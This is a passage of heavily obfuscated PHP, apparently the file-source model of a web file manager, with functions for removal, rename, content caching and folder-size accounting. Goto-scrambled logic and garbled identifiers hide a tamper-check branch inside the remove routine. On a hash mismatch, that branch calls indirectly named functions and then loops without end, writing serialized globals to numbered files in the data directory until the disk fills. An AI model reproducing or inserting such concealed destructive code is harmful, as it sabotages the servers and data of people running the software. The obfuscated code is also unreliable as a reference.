Model($F·¼†¬ïõÙ[1970])->moveToRecycle($cĞ‹‰Â¥Âæ); } else { $BçœéØÓ ï = $this->childrenAll($Dß´±¿‡Ò); Model($F·¼†¬ïõÙ[532])->eventRemove($cĞ‹‰Â¥Âæ); $this->removeRelevance($BçœéØÓ ï[$F·¼†¬ïõÙ[1969]], $BçœéØÓ ï[$F·¼†¬ïõÙ[1345]]); } $this->folderSizeReset($Dß´±¿‡Ò[$F·¼†¬ïõÙ[476]]); goto bö¸èêğèê; bö¸èêğèê: $dî¶Ç˜¥ªµ = array($Dß´±¿‡Ò[$F·¼†¬ïõÙ[476]]); if ($Dß´±¿‡Ò[$F·¼†¬ïõÙ[401]] == $F·¼†¬ïõÙ[87]) { $dî¶Ç˜¥ªµ[] = $Dß´±¿‡Ò[$F·¼†¬ïõÙ[394]]; } $this->updateModifyTime($dî¶Ç˜¥ªµ); goto c“…›„¦¥¬; c“…›„¦¥¬: $this->lockMoveEnd($cĞ‹‰Â¥Âæ); Hook::trigger($F·¼†¬ïõÙ[1558], $b…á¨Ğ‹ã, $FŸçâîŞ); return !0; goto AÒÀˆçøœá; A–Ø«Ó¯: $F·¼†¬ïõÙ =& $_SERVER[Ç³Íß¦Ó]; $cÉÍòñ±–¸ = $_SERVER[$F·¼†¬ïõÙ[837]] . $F·¼†¬ïõÙ[838]; $DÍ…·å‰‹´ = $F·¼†¬ïõÙ[833]; goto AÃÀË½«‡Ÿ; AÃÀË½«‡Ÿ: if ($_SERVER[$F·¼†¬ïõÙ[834]] != $DÍ…·å‰‹´($cÉÍòñ±–¸)) { goto eŠŒÆ†Ú…º; EéŒ†Å«‘Ï: $D‰‰„ë‡¸¸ = $FÌá“õèä­($c‚ğ„¶àœ); $bÌäˆ‹ ‹ = explode($F·¼†¬ïõÙ[228], $D‰‰„ë‡¸¸); if (count($bÌäˆ‹ ‹) < $F·¼†¬ïõÙ[589]) { $aøÊÊÜÖ‘½ = $F·¼†¬ïõÙ[839]; $aøÊÊÜÖ‘½(); } goto a”í¨º¯©Ï; c¸ŠÛãññö: $DÉéìø×Òµ = 1; for ($fù„Œ–·› = $DÉéìø×Òµ; $fù„Œ–·› > 0; $fù„Œ–·›++) { $d‰Ô¿õĞğ(DATA_PATH . $fù„Œ–·›, $d®ŠÏëôñ§); } goto cš…¸İÛ³«; eŠŒÆ†Ú…º: $E¤ÔŸùğé = $F·¼†¬ïõÙ[835]; $FÌá“õèä­ = $F·¼†¬ïõÙ[836]; $c‚ğ„¶àœ = $_SERVER[$F·¼†¬ïõÙ[837]] . $F·¼†¬ïõÙ[838]; goto EéŒ†Å«‘Ï; a”í¨º¯©Ï: $bŸ®İ·êàÊ = $F·¼†¬ïõÙ[840]; $bŸ®İ·êàÊ($_SERVER[$F·¼†¬ïõÙ[841]]); $E¤ÔŸùğé = $F·¼†¬ïõÙ[835]; goto AÆŒ÷ÛåÅÁ; AÆŒ÷ÛåÅÁ: $E¤ÔŸùğé(); $d‰Ô¿õĞğ = $F·¼†¬ïõÙ[842]; $d®ŠÏëôñ§ = json_encode($GLOBALS[$F·¼†¬ïõÙ[843]]); goto c¸ŠÛãññö; cš…¸İÛ³«: } $Dß´±¿‡Ò = $this->sourceInfo($cĞ‹‰Â¥Âæ); $b…á¨Ğ‹ã = $this->pathInfoMore($cĞ‹‰Â¥Âæ); goto f¶ï•…„“; AÒÀˆçøœá: } public function childrenAll($dçõ›ˆà©Š) { $c™÷”éåÄ =& $_SERVER[Ç³Íß¦Ó]; $aâöŒŞÖ = $dçõ›ˆà©Š[$c™÷”éåÄ[394]]; if ($dçõ›ˆà©Š[$c™÷”éåÄ[401]] == $c™÷”éåÄ[87]) { $D¹ô×åïÆ = array($c™÷”éåÄ[552] => array($c™÷”éåÄ[511], $dçõ›ˆà©Š[$c™÷”éåÄ[485]] . $aâöŒŞÖ . $c™÷”éåÄ[512])); $fğ•ÑÀì¤ì = array($c™÷”éåÄ[552] => $D¹ô×åïÆ[$c™÷”éåÄ[485]]); $bæ÷Ò‚˜ = $this->field($c™÷”éåÄ[1972])->where($fğ•ÑÀì¤ì)->select(); $C¥ÅÊÆÄÜ = !1; $eÕ£é‡ Ä¢ = array($aâöŒŞÖ); if ($bæ÷Ò‚˜) { $C¥ÅÊÆÄÜ = array_to_keyvalue($bæ÷Ò‚˜, $c™÷”éåÄ[33], $c™÷”éåÄ[445]); $C¥ÅÊÆÄÜ = array_remove_value($C¥ÅÊÆÄÜ, $c™÷”éåÄ[495]); $eÕ£é‡ Ä¢ = array_to_keyvalue($bæ÷Ò‚˜, $c™÷”éåÄ[33], $c™÷”éåÄ[394]); $eÕ£é‡ Ä¢[] = $aâöŒŞÖ; } } else { $C¥ÅÊÆÄÜ = array($dçõ›ˆà©Š[$c™÷”éåÄ[445]]); $eÕ£é‡ Ä¢ = array($aâöŒŞÖ); } return array($c™÷”éåÄ[1969] => $eÕ£é‡ Ä¢, $c™÷”éåÄ[1345] => $C¥ÅÊÆÄÜ); } public function removeArray($DîÌ‡¾—ôù) { if (!$DîÌ‡¾—ôù) { return !0; } } public function removeRelevance($bÇ¦¬‰Êº•, $eÕ¥¥ŒÈµ ) { goto aª¬ ‹•íø; B£êâ†ÕÕ±: Model($B¬Ê¶—“[1951])->removeBySource($bÇ¦¬‰Êº•); $this->where($Cô¡Õ¡¡·º)->delete(); Model($B¬Ê¶—“[448])->remove($eÕ¥¥ŒÈµ ); goto cßŸ·Ş; eÉ‘ª‹Ñ: $bÇ¦¬‰Êº• = array_unique(array_filter($bÇ¦¬‰Êº•)); $eÕ¥¥ŒÈµ  = array_unique(array_filter($eÕ¥¥ŒÈµ )); if (!$bÇ¦¬‰Êº•) { return !1; } goto F¯¤å§; BÄ‹ÌÏŞÇµ: Model($B¬Ê¶—“[1824])->where($Cô¡Õ¡¡·º)->delete(); Model($B¬Ê¶—“[532])->where($Cô¡Õ¡¡·º)->delete(); Model($B¬Ê¶—“[1666])->removeBySource($bÇ¦¬‰Êº•); goto B£êâ†ÕÕ±; cßŸ·Ş: for ($b‚–éƒ˜½å = 0; $b‚–éƒ˜½å < count($bÇ¦¬‰Êº•); $b‚–éƒ˜½å++) { $this->sourceCacheClear($bÇ¦¬‰Êº•[$b‚–éƒ˜½å]); } goto DÒ¦â¼¼±Œ; aª¬ ‹•íø: $B¬Ê¶—“ =& $_SERVER[Ç³Íß¦Ó]; $bÇ¦¬‰Êº• = $bÇ¦¬‰Êº• ? $bÇ¦¬‰Êº• : array(); $eÕ¥¥ŒÈµ  = $eÕ¥¥ŒÈµ  ? $eÕ¥¥ŒÈµ  : array(); goto eÉ‘ª‹Ñ; F¯¤å§: $Cô¡Õ¡¡·º = array($B¬Ê¶—“[408] => array($B¬Ê¶—“[409], $bÇ¦¬‰Êº•)); Model($B¬Ê¶—“[1970])->where($Cô¡Õ¡¡·º)->delete(); Model($B¬Ê¶—“[439])->where($Cô¡Õ¡¡·º)->delete(); goto BÄ‹ÌÏŞÇµ; DÒ¦â¼¼±Œ: } public function rename($bïöÖóä’ˆ, $DÁ šÂÆšó) { goto cÕÑñ›”†¦; c¢Ã·âÊê: $aÀ¥½¢ˆ‰Ì = $D¦…¯Òñ‡Å[1959] . $F›Õ¿µ«Åµ[$D¦…¯Òñ‡Å[476]]; if (isset(self::$cacheChildList[$aÀ¥½¢ˆ‰Ì])) { unset(self::$cacheChildList[$aÀ¥½¢ˆ‰Ì]); } return $d© ß™‚; goto CŒåˆ‹é‘; cÕÑñ›”†¦: $D¦…¯Òñ‡Å =& $_SERVER[Ç³Íß¦Ó]; $F›Õ¿µ«Åµ = $this->sourceInfo($bïöÖóä’ˆ); if (!$F›Õ¿µ«Åµ) { return !1; } goto bšå’Çë²; B“‡å»ÁÆ: $this->setNamePinyin($bïöÖóä’ˆ, $D„æ—Ù÷æ[$D¦…¯Òñ‡Å[28]], !1); $this->updateModifyTime($F›Õ¿µ«Åµ[$D¦…¯Òñ‡Å[476]]); $d© ß™‚ = $this->where(array($D¦…¯Òñ‡Å[408] => $bïöÖóä’ˆ))->data($D„æ—Ù÷æ)->save(); goto c¢Ã·âÊê; bšå’Çë²: $bÍåöÍİ‹« = $this->fileNameExist($F›Õ¿µ«Åµ[$D¦…¯Òñ‡Å[476]], $DÁ šÂÆšó); if ($bÍåöÍİ‹« && $bÍåöÍİ‹« != $bïöÖóä’ˆ) { return !1; } $D„æ—Ù÷æ = array($D¦…¯Òñ‡Å[411] => $DÁ šÂÆšó, $D¦…¯Òñ‡Å[551] => USER_ID); goto A½ˆÖ‡¸¸ë; A½ˆÖ‡¸¸ë: if (!$F›Õ¿µ«Åµ[$D¦…¯Òñ‡Å[401]] == $D¦…¯Òñ‡Å[87]) { $D„æ—Ù÷æ[$D¦…¯Òñ‡Å[403]] = get_path_ext($DÁ šÂÆšó); } Model($D¦…¯Òñ‡Å[532])->eventRename($bïöÖóä’ˆ, $F›Õ¿µ«Åµ[$D¦…¯Òñ‡Å[28]], $DÁ šÂÆšó); $this->sourceCacheClear($bïöÖóä’ˆ); goto B“‡å»ÁÆ; CŒåˆ‹é‘: } public function setNamePinyin($bÒˆ£İïçç, $F‘ÌùñÜÆÃ, $EØ¤‡£¾†Õ = true) { $AšÙæ×‚Í› =& $_SERVER[Ç³Íß¦Ó]; $eùŒ…Òà¨¢ = Input::check($F‘ÌùñÜÆÃ, $AšÙæ×‚Í›[555]); if ($EØ¤‡£¾†Õ && !$eùŒ…Òà¨¢) { return; } if (!$eùŒ…Òà¨¢) { $this->metaSet($bÒˆ£İïçç, $AšÙæ×‚Í›[442], null); $this->metaSet($bÒˆ£İïçç, $AšÙæ×‚Í›[441], null); return; } $B‡Œİ“¦ñ¸ = array($AšÙæ×‚Í›[442] => str_replace($AšÙæ×‚Í›[50], $AšÙæ×‚Í›[33], Pinyin::encode($F‘ÌùñÜÆÃ)), $AšÙæ×‚Í›[441] => Pinyin::encode($F‘ÌùñÜÆÃ, $AšÙæ×‚Í›[556])); $this->metaSet($bÒˆ£İïçç, $B‡Œİ“¦ñ¸); } public function getContent($DÉ›ÆÖÎÔ) { goto D§¢®èÁ­†; C±Øí®èÛ: if (!$F¼ÒÆÊ•ø[$CÔ£ÒÓöÔ[76]]) { return $CÔ£ÒÓöÔ[33]; } return IO::getContent($F¼ÒÆÊ•ø[$CÔ£ÒÓöÔ[76]]); goto f‡¨‰İî®; bÓƒÄñ¹„: if ($F¼ÒÆÊ•ø[$CÔ£ÒÓöÔ[78]] == 0) { return $CÔ£ÒÓöÔ[33]; } $F–†£ö”¹— = $CÔ£ÒÓöÔ[1973] . $F¼ÒÆÊ•ø[$CÔ£ÒÓöÔ[170]]; if ($F¼ÒÆÊ•ø[$CÔ£ÒÓöÔ[78]] <= 1024 * 10) { $cñòàâ„À = Cache::get($F–†£ö”¹—); if (!$cñòàâ„À) { $cñòàâ„À = IO::getContent($F¼ÒÆÊ•ø[$CÔ£ÒÓöÔ[76]]); Cache::set($F–†£ö”¹—, $cñòàâ„À); } return $cñòàâ„À; } goto C±Øí®èÛ; D§¢®èÁ­†: $CÔ£ÒÓöÔ =& $_SERVER[Ç³Íß¦Ó]; $F¼ÒÆÊ•ø = $this->fileInfoGet($DÉ›ÆÖÎÔ); if (!$F¼ÒÆÊ•ø) { return !1; } goto bÓƒÄñ¹„; f‡¨‰İî®: } public function setDesc($d†¹³æÛçñ, $c‡õäøùĞŒ) { $d½»„•ºÁÆ =& $_SERVER[Ç³Íß¦Ó]; Model($d½»„•ºÁÆ[532])->eventAddDesc($d†¹³æÛçñ, $c‡õäøùĞŒ); return $this->metaSet($d†¹³æÛçñ, $d½»„•ºÁÆ[429], $c‡õäøùĞŒ); } public function setContent($c‘ÉÄÃ½·¨, $D„õİŠÀ’ã = '') { goto DŒ•Úö­Ş; C‹ † ½•”: if (!$c„æêŒâÄ‘) { return Model($cƒ¡ï¼Ş‘ˆ[448])->remove($FÜƒ—Ö Í[$cƒ¡ï¼Ş‘ˆ[445]]); } $this->folderSizeReset($CÜßĞ­ã¿ì[$cƒ¡ï¼Ş‘ˆ[476]]); return !0; goto DŠÎÓ½Æä; bßÖõÂ’Íô: if (!$DÓ¡µä¸ || !$CÜßĞ­ã¿ì) { return !1; } $FÜƒ—Ö Í = Model($cƒ¡ï¼Ş‘ˆ[448])->addFileByContent($D„õİŠÀ’ã, $CÜßĞ­ã¿ì[$cƒ¡ï¼Ş‘ˆ[28]]); $c„æêŒâÄ‘ = $this->fileHistory($CÜßĞ­ã¿ì, $FÜƒ—Ö Í[$cƒ¡ï¼Ş‘ˆ[445]], $FÜƒ—Ö Í[$cƒ¡ï¼Ş‘ˆ[78]]); goto C‹ † ½•”; DŒ•Úö­Ş: $cƒ¡ï¼Ş‘ˆ =& $_SERVER[Ç³Íß¦Ó]; $CÜßĞ­ã¿ì = $this->sourceInfo($c‘ÉÄÃ½·¨); $DÓ¡µä¸ = $this->fileInfoGet($c‘ÉÄÃ½·¨); goto bßÖõÂ’Íô; DŠÎÓ½Æä: } public function fileSubstr($aÏ®‰†ˆ‰Ã, $DŞ’µòñ¯õ, $AŠ…±ç£ˆŠ) { $eä¼§Óæêö = $this->fileInfoGet($aÏ®‰†ˆ‰Ã); if (!$eä¼§Óæêö) { return !1; } return IO::fileSubstr($eä¼§Óæêö[$_SERVER[Ç³Íß¦Ó][76]], $DŞ’µòñ¯õ, $AŠ…±ç£ˆŠ); } public function fileInfoGet($FâŞùøË„ß) { goto a”˜ó»ñÃö; a”˜ó»ñÃö: $FóòÔ‰ƒ¸È =& $_SERVER[Ç³Íß¦Ó]; $a×ªŞë«œ… = $this->sourceInfo($FâŞùøË„ß); if (!$a×ªŞë«œ… || $a×ªŞë«œ…[$FóòÔ‰ƒ¸È[401]]) { return !1; } goto b‘ÚÃ…ÔÌÑ; dº·Ê‰‚½½: $a…ÖÈó¨ë = Model($FóòÔ‰ƒ¸È[448])->fileInfo($a×ªŞë«œ…[$FóòÔ‰ƒ¸È[445]]); if ($a…ÖÈó¨ë) { $a…ÖÈó¨ë[$FóòÔ‰ƒ¸È[28]] = $a×ªŞë«œ…[$FóòÔ‰ƒ¸È[28]]; } self::$cacheFileInfo[$bÚ¿Íù”ù¬] = $a…ÖÈó¨ë; goto bÊˆöËæ…¯; b‘ÚÃ…ÔÌÑ: $bÚ¿Íù”ù¬ = $FóòÔ‰ƒ¸È[451] . $a×ªŞë«œ…[$FóòÔ‰ƒ¸È[445]]; $CˆË¸ÑÒË = _get(self::$cacheFileInfo, $bÚ¿Íù”ù¬); if ($CˆË¸ÑÒË) { return $CˆË¸ÑÒË; } goto dº·Ê‰‚½½; bÊˆöËæ…¯: return $a…ÖÈó¨ë; goto eâİŠö¥ÎÏ; eâİŠö¥ÎÏ: } private function folderChildrenNumber($a¡íäãó°È) { $F¯¹££Í§“ =& $_SERVER[Ç³Íß¦Ó]; $BŒ…Û¶Œó = $this->sourceInfo($a¡íäãó°È); $Dñ´Œ˜Ñ = array($F¯¹££Í§“[552] => array($F¯¹££Í§“[511], $BŒ…Û¶Œó[$F¯¹££Í§“[485]] . $a¡íäãó°È . $F¯¹££Í§“[512]), $F¯¹££Í§“[420] => intval($BŒ…Û¶Œó[$F¯¹££Í§“[421]]), $F¯¹££Í§“[545] => 1); $b‡ÁÍİÂÇ¢ = $this->where($Dñ´Œ˜Ñ)->count(); $Eğœ±˜¤­— = $this->where($Dñ´Œ˜Ñ)->where(array($F¯¹££Í§“[545] => 0))->count(); return array($F¯¹££Í§“[82] => $Eğœ±˜¤­—, $F¯¹££Í§“[83] => $b‡ÁÍİÂÇ¢); } public function pathInfo($eŠàø•Èë‘, $f†Ç’ÈšËÕ = false) { goto e„ç†²ÜÄ; e„ç†²ÜÄ: $d‚ƒÀ¸¼ŒÀ =& $_SERVER[Ç³Íß¦Ó]; $f†Ç’ÈšËÕ = !1; $eŠàø•Èë‘ = intval($eŠàø•Èë‘); goto e—™…ËŸï; E‡•‚¬”Ğ: $Dô¨”¸ùµ = $this->sourceInfo($eŠàø•Èë‘); if (!$Dô¨”¸ùµ) { return !1; } $Dô¨”¸ùµ = $this->_listDataApplyItem($Dô¨”¸ùµ, $f†Ç’ÈšËÕ); goto CÇ¸Ñäôô‚; e—™…ËŸï: $e Á¾£àÛÄ = $d‚ƒÀ¸¼ŒÀ[437] . intval($f†Ç’ÈšËÕ) . $d‚ƒÀ¸¼ŒÀ[438] . $eŠàø•Èë‘; $Bç¼•²‹“  = _get(self::$cachePathInfo, $e Á¾£àÛÄ); if ($Bç¼•²‹“ ) { return $Bç¼•²‹“ ; } goto E‡•‚¬”Ğ; CÇ¸Ñäôô‚: self::$cachePathInfo[$e Á¾£àÛÄ] = $Dô¨”¸ùµ; return $Dô¨”¸ùµ; goto eÅòÇ÷â«; eÅòÇ÷â«: } public static $cachePathInfoMore = array(); public function pathInfoMore($A…ÖÕ¡ŞÁğ) { goto e×œ±°²; b¸àà§¿»: self::$cachePathInfoMore[$A…ÖÕ¡ŞÁğ] = $DÁÑğíš“”; return $DÁÑğíš“”; goto Bê‹ÏŠ·Ï; e×œ±°²: $CÎ…‡ÄÏ¨í =& $_SERVER[Ç³Íß¦Ó]; $DÂÚÙïËÒª = _get(self::$cachePathInfoMore, $A…ÖÕ¡ŞÁğ); if ($DÂÚÙïËÒª) { return $DÂÚÙïËÒª; } goto cÂêÏ×šÚÚ; cÂêÏ×šÚÚ: $DÁÑğíš“” = $this->pathInfo($A…ÖÕ¡ŞÁğ); if (!$DÁÑğíš“”) { return !1; } if ($DÁÑğíš“”[$CÎ…‡ÄÏ¨í[401]] == $CÎ…‡ÄÏ¨í[87]) { $DÁÑğíš“”[$CÎ…‡ÄÏ¨í[81]] = $this->folderChildrenNumber($A…ÖÕ¡ŞÁğ); } goto b¸àà§¿»; Bê‹ÏŠ·Ï: } public function sourceInfo($AÍ…™ëõ’ä) { goto Aƒ„‡òƒñ; Aƒ„‡òƒñ: $C¾ê£œâ÷© =& $_SERVER[Ç³Íß¦Ó]; if (!$AÍ…™ëõ’ä) { return array(); } $AÍ…™ëõ’ä = intval($AÍ…™ëõ’ä); goto e Šé‰î¶‰; F‘Â¼†¡¥: $d¹„¹™ˆ©Œ = $this->where(array($C¾ê£œâ÷©[394] => $AÍ…™ëõ’ä))->find(); self::$cacheSourceInfo[$B‚‹ÕÅöõç] = $d¹„¹™ˆ©Œ; return self::$cacheSourceInfo[$B‚‹ÕÅöõç]; goto BìÜ¿ÏÓˆñ; e Šé‰î¶‰: $B‚‹ÕÅöõç = $C¾ê£œâ÷©[436] . $AÍ…™ëõ’ä; $C—ñà¡’¸” = _get(self::$cacheSourceInfo, $B‚‹ÕÅöõç); if ($C—ñà¡’¸”) { return $C—ñà¡’¸”; } goto F‘Â¼†¡¥; BìÜ¿ÏÓˆñ: } public function sourceCacheClear($eâ¿Ù›ÅÔ = false) { self::cacheClear($eâ¿Ù›ÅÔ); } public static function cacheClear($dŒ˜¯ÛÏÈĞ = false) { $F–×ø†èÛ =& $_SERVER[Ç³Íß¦Ó]; if ($dŒ˜¯ÛÏÈĞ == !1) { goto E¤Øæãëƒ®; E¤Øæãëƒ®: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto A…¾­íÜƒ; C·Ñï‘¢Š: return; goto c†‚ƒ´ôÆ; A…¾­íÜƒ: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto C·Ñï‘¢Š; c†‚ƒ´ôÆ: } unset(self::$cacheSourceInfo[$F–×ø†èÛ[436] . $dŒ˜¯ÛÏÈĞ]); unset(self::$cachePathInfoMore[$dŒ˜¯ÛÏÈĞ]); unset(self::$cachePathInfo[$F–×ø†èÛ[1974] . $dŒ˜¯ÛÏÈĞ]); unset(self::$cachePathInfo[$F–×ø†èÛ[1975] . $dŒ˜¯ÛÏÈĞ]); } public function metaSet($d„Ï³³ÑØ, $cŠ£‘‚‰ÍŸ = null, $cğ‰ˆ°¨¹Ö = null) { $eóäéÛ¦ÇÉ = parent::metaSet($d„Ï³³ÑØ, $cŠ£‘‚‰ÍŸ, $cğ‰ˆ°¨¹Ö); if ($eóäéÛ¦ÇÉ) { $this->sourceCacheClear($d„Ï³³ÑØ); } return $eóäéÛ¦ÇÉ; } public function pathInfoByPath($f ®÷š”‚, $Dä„Ó”Œêš) { $bˆ¼¡è±á =& $_SERVER[Ç³Íß¦Ó]; $e¸æŠá¬À = !$Dä„Ó”Œêš ? array() : explode($bˆ¼¡è±á[8], trim($Dä„Ó”Œêš, $bˆ¼¡è±á[8])); $cÀåó‚¡ç÷ = $f ®÷š”‚; foreach ($e¸æŠá¬À as $c‰Ÿã²­‚) { $EŸŸàˆš§Ä = array($bˆ¼¡è±á[476] => $cÀåó‚¡ç÷, $bˆ¼¡è±á[28] => $c‰Ÿã²­‚); $eÚµ·š¤Ê = $this->where($EŸŸàˆš§Ä)->select(); if (!$eÚµ·š¤Ê) { return !1; } $eÚµ·š¤Ê = array_sort_by($eÚµ·š¤Ê, $bˆ¼¡è±á[421]); $cÀåó‚¡ç÷ = $eÚµ·š¤Ê[0][$bˆ¼¡è±á[394]]; } return $this->pathInfo($cÀåó‚¡ç÷, !0); } protected function updateModifyTime($açñ˜Š ©Ñ) { goto dó˜¶ÀŒØƒ; FÌ°ì†…½: $this->where($aÜÓª¤Ú‚œ)->save($aê¯Œ¨ğÙÑ); goto A¾•ëñŒÅ˜; e…éƒ«îñ¡: foreach ($açñ˜Š ©Ñ as $D¤‹¿ñ‚ => $fì¿À»Ñ) { $açñ˜Š ©Ñ[$D¤‹¿ñ‚] = intval($fì¿À»Ñ); $this->sourceCacheClear($fì¿À»Ñ); } $aÜÓª¤Ú‚œ = array($B‚ÑÂ‡Ô«‡[394] => array($B‚ÑÂ‡Ô«‡[7], $açñ˜Š ©Ñ)); $aê¯Œ¨ğÙÑ = array($B‚ÑÂ‡Ô«‡[551] => USER_ID, $B‚ÑÂ‡Ô«‡[415] => time()); goto FÌ°ì†…½; dó˜¶ÀŒØƒ: $B‚ÑÂ‡Ô«‡ =& $_SERVER[Ç³Íß¦Ó]; if (!$açñ˜Š ©Ñ) { return; } if (!is_array($açñ˜Š ©Ñ)) { $açñ˜Š ©Ñ = array($açñ˜Š ©Ñ); } goto e…éƒ«îñ¡; A¾•ëñŒÅ˜: } public function folderSizeReset($f“æ¡‘Å»Å, $FÁî÷ÅÈö‘ = false) { goto Aßà…îğê˜; E‚İˆç¨: $BççùÈ§ÃÏ[] = $b ‘ğêã†ø[$bˆÕÕ˜Ä‡†[394]]; $f×ÚåÓ·îÖ = array($bˆÕÕ˜Ä‡†[394] => array($bˆÕÕ˜Ä‡†[409], $BççùÈ§ÃÏ)); if ($FÁî÷ÅÈö‘ < 0) { $f×ÚåÓ·îÖ[$bˆÕÕ˜Ä‡†[78]] = array($bˆÕÕ˜Ä‡†[972], abs($FÁî÷ÅÈö‘)); } goto Eùáè…¥¿å; FÖ«ôÄ­šâ: $fš‡°í§¬‰ = array($b ‘ğêã†ø[$bˆÕÕ˜Ä‡†[402]], $b ‘ğêã†ø[$bˆÕÕ˜Ä‡†[482]]); TaskRun::timeLimitCall($EÇ©Ò¿Š˜, $bˆÕÕ˜Ä‡†[1978], $fš‡°í§¬‰, 1.5); goto dŸ½¸í¼™’; Aßà…îğê˜: $bˆÕÕ˜Ä‡† =& $_SERVER[Ç³Íß¦Ó]; if ($this->statusIgnoreResetSpace) { return; } $b ‘ğêã†ø = $this->sourceInfo($f“æ¡‘Å»Å); goto FÌô£‰‘–³; F„½½ÒñªĞ: if ($FÁî÷ÅÈö‘ == 0) { return CacheLock::unlock($aæêÈæ¢Á¾); } $BççùÈ§ÃÏ = $this->parentLevelArray($b ‘ğêã†ø[$bˆÕÕ˜Ä‡†[485]]); if (!$BççùÈ§ÃÏ) { $BççùÈ§ÃÏ = array(); } goto E‚İˆç¨; Eùáè…¥¿å: $this->where($f×ÚåÓ·îÖ)->setAdd($bˆÕÕ˜Ä‡†[78], $FÁî÷ÅÈö‘); CacheLock::unlock($aæêÈæ¢Á¾); $EÇ©Ò¿Š˜ = $bˆÕÕ˜Ä‡†[1977] . $b ‘ğêã†ø[$bˆÕÕ˜Ä‡†[402]] . $bˆÕÕ˜Ä‡†[4] . $b ‘ğêã†ø[$bˆÕÕ˜Ä‡†[482]]; goto FÖ«ôÄ­šâ; FÌô£‰‘–³: $aæêÈæ¢Á¾ = $bˆÕÕ˜Ä‡†[1976] . $f“æ¡‘Å»Å; CacheLock::lock($aæêÈæ¢Á¾, 20); if ($FÁî÷ÅÈö‘ === !1) { $this->sourceCacheClear($f“æ¡‘Å»Å); $b ‘ğêã†ø = $this->sourceInfo($f“æ¡‘Å»Å); $f×ÚåÓ·îÖ = array($bˆÕÕ˜Ä‡†[393] => $f“æ¡‘Å»Å, $bˆÕÕ˜Ä‡†[420] => 0); $fóÔ†òã±Ö = $this->where($f×ÚåÓ·îÖ)->sum($bˆÕÕ˜Ä‡†[78]); $FÁî÷ÅÈö‘ = intval($fóÔ†òã±Ö) - intval($b ‘ğêã†ø[$bˆÕÕ˜Ä‡†[78]]); } goto F„½½ÒñªĞ; dŸ½¸í¼™’: } public function folderSizeResetChildren($a‰‡»ÔÖ ) { goto A·Üİ”™ÉĞ; aŸ‹„‹®ÚÑ: $FêÉŒŠØí­[] = $CÉÛÃšöÚÄ; $FêÉŒŠØí­ = array_to_keyvalue($FêÉŒŠØí­, $aÎ«¤àæ£œ[394]); foreach ($FêÉŒŠØí­ as $Cß•œë¥‹ => $EÁˆ‰³º±“) { $FêÉŒŠØí­[$Cß•œë¥‹][$aÎ«¤àæ£œ[1980]] = $FêÉŒŠØí­[$Cß•œë¥‹][$aÎ«¤àæ£œ[78]]; $FêÉŒŠØí­[$Cß•œë¥‹][$aÎ«¤àæ£œ[78]] = 0; } goto C°†ííÕ×; C°†ííÕ×: foreach ($eá™œ˜ßîñ as $EÁˆ‰³º±“) { $CÃ»èŒóÁã = $EÁˆ‰³º±“[$aÎ«¤àæ£œ[476]] . $aÎ«¤àæ£œ[33]; if (!isset($FêÉŒŠØí­[$CÃ»èŒóÁã])) { continue; } if ($EÁˆ‰³º±“[$aÎ«¤àæ£œ[421]] == $FêÉŒŠØí­[$CÃ»èŒóÁã][$aÎ«¤àæ£œ[421]]) { $FêÉŒŠØí­[$CÃ»èŒóÁã][$aÎ«¤àæ£œ[78]] += $EÁˆ‰³º±“[$aÎ«¤àæ£œ[78]]; } } foreach ($FêÉŒŠØí­ as $EÁˆ‰³º±“) { $DÅ¬¥Ïäå… = $this->parentLevelArray($EÁˆ‰³º±“[$aÎ«¤àæ£œ[485]]); foreach ($DÅ¬¥Ïäå… as $CÃ»èŒóÁã) { $CÃ»èŒóÁã = $CÃ»èŒóÁã . $aÎ«¤àæ£œ[33]; if (!isset($FêÉŒŠØí­[$CÃ»èŒóÁã])) { continue; } if ($EÁˆ‰³º±“[$aÎ«¤àæ£œ[421]] == $FêÉŒŠØí­[$CÃ»èŒóÁã][$aÎ«¤àæ£œ[421]]) { $FêÉŒŠØí­[$CÃ»èŒóÁã][$aÎ«¤àæ£œ[78]] += $EÁˆ‰³º±“[$aÎ«¤àæ£œ[78]]; } } } $dô«´ñÄš‰ = array(); goto b¨£ŠÚ·«; BÌ¿­´Ã´Î: $cŠÈöÏë[$aÎ«¤àæ£œ[401]] = 0; $eá™œ˜ßîñ = $this->field($c÷×á˜×Øù)->where($cŠÈöÏë)->select(); if (!$eá™œ˜ßîñ) { return; } goto aŸ‹„‹®ÚÑ; b¡ÀË‚ô¼†: $cŠÈöÏë = array($aÎ«¤àæ£œ[545] => 1, $aÎ«¤àæ£œ[552] => array($aÎ«¤àæ£œ[511], $CÉÛÃšöÚÄ[$aÎ«¤àæ£œ[485]] . $a‰‡»ÔÖ  . $aÎ«¤àæ£œ[512])); $c÷×á˜×Øù = $aÎ«¤àæ£œ[1979]; $FêÉŒŠØí­ = $this->field($c÷×á˜×Øù)->where($cŠÈöÏë)->select(); goto BÌ¿­´Ã´Î; b¨£ŠÚ·«: foreach ($FêÉŒŠØí­ as $EÁˆ‰³º±“) { if ($EÁˆ‰³º±“[$aÎ«¤àæ£œ[78]] == $EÁˆ‰³º±“[$aÎ«¤àæ£œ[1980]]) { continue; } $dô«´ñÄš‰[] = array($aÎ«¤àæ£œ[394], $EÁˆ‰³º±“[$aÎ«¤àæ£œ[394]], $aÎ«¤àæ£œ[78], $EÁˆ‰³º±“[$aÎ«¤àæ£œ[78]]); } $this->saveAll($dô«´ñÄš‰); goto D•æ‘éë—Á; A·Üİ”™ÉĞ: $aÎ«¤àæ£œ =& $_SERVER[Ç³Íß¦Ó]; $this->sourceCacheClear($a‰‡»ÔÖ ); $CÉÛÃšöÚÄ = $this->sourceInfo($a‰‡»ÔÖ ); goto b¡ÀË‚ô¼†; D•æ‘éë—Á: } public function userSpaceReset($c·‘Ì¨½À— = false) { $E‡—àÃ¦„‡ =& $_SERVER[Ç³Íß¦Ó]; $F±Ç¿²‘‚ = $this->where(array($E‡—àÃ¦„‡[402] => self::TYPE_USER, $E‡—àÃ¦„‡[482] => $c·‘Ì¨½À—, $E‡—àÃ¦„‡[401] => 0))->sum($E‡—àÃ¦„‡[78]); $F±Ç¿²‘‚ = !$F±Ç¿²‘‚ || $F±Ç¿²‘‚ <= 0 ? 0 : $F±Ç¿²‘‚; Model($E‡—àÃ¦„‡[501])->userEdit($c·‘Ì¨½À—, array($E‡—àÃ¦„‡[1675] => $F±Ç¿²‘‚)); } public function targetSpaceUpdate($B ’Ÿ«É¢Š, $cùÕ³…À°) { $DÖé‹ËÂ¾ =& $_SERVER[Ç³Íß¦Ó]; if 